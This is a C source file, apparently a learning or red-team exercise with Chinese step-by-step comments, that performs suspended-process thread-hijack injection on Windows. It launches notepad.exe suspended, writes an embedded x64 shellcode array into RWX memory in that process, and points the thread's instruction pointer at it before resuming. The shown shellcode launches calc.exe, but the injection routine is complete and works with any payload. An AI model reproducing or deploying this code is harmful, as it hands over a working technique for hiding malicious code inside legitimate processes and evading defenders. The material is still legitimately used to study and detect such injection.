#include <stdio.h>
#include <Windows.h>
#include <Tlhelp32.h>

int suspandthreat_injection_main1()
{
	UCHAR shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
	0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
	0x65, 0x78, 0x65, 0x00
	};

	// 定义两个进程相关的结构体变量，都是内置结构体，可以直接定义，然后初始化为0
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };
	/*
		typedef struct _PROCESS_INFORMATION {
			HANDLE hProcess;
			HANDLE hThread;
			DWORD dwProcessId;
			DWORD dwThreadId;
		} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
	*/

	// 创建notepad.exe进程，不用从父进程继承，创建之后状态为挂起，并且将信息赋值给si和pi
	// CreateProcessA ，CreateProcessW可能会产生错误，因为notepad字符串问题。
	if (!CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("Create process failed error code: %d\n", (int)GetLastError());
		return 1;
	}


	// 根据进程id打开进程
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
	if (hProcess == NULL)
	{
		printf("Open process failed error code: %d\n", (int)GetLastError());
		return 1;
	}

	// 利用api挂起进程, 前面已经创建了挂起主线程的进程，这里如果再次挂起那么就需要resume两次才行（挂起次数是累计的）
	// SuspendThread(pi.hThread);

	// 申请一个目标进程中的内存区域
	LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBuffer == NULL)
	{
		printf("Virtual alloc failed error code ：%d\n", (int)GetLastError());
		return 1;
	}
	// 显示出来申请区域的地址，方便调试的时候找
	printf("shellcode address is : %p\n", lpBuffer);

	// 将shellcode写进去，和远程进程注入一样
	if (!WriteProcessMemory(hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL))
	{
		printf("Write process memory failed error code：%d\n", (int)GetLastError());
		return 1;
	}

	// 设置线程的上下文环境，让ip寄存器直接跳转
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(pi.hThread, &ctx))
	{
		printf("GetThreadContext failed error code ：%d\n", (int)GetLastError());
		return 1;
	}
	// 设置ip寄存器直接指向那块地址
	ctx.Rip = (DWORD64)lpBuffer;

	// 设置保存线程环境
	if (!SetThreadContext(pi.hThread, &ctx))
	{
		printf("SetThreadContext failed error code ：%d\n", (int)GetLastError());
		return 1;
	}

	// 恢复线程环境，这时就可以执行shellcode了
	if (ResumeThread(pi.hThread) == -1)
	{
		printf("ResumeThread failed error code ：%d\n", (int)GetLastError());
		return 1;
	}

	// 等待目标进程结束（这里可以直接从任务管理器关闭）
	// WaitForSingleObject(pi.hProcess, INFINITE);

	// 清理恢复句柄释放空间
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;
}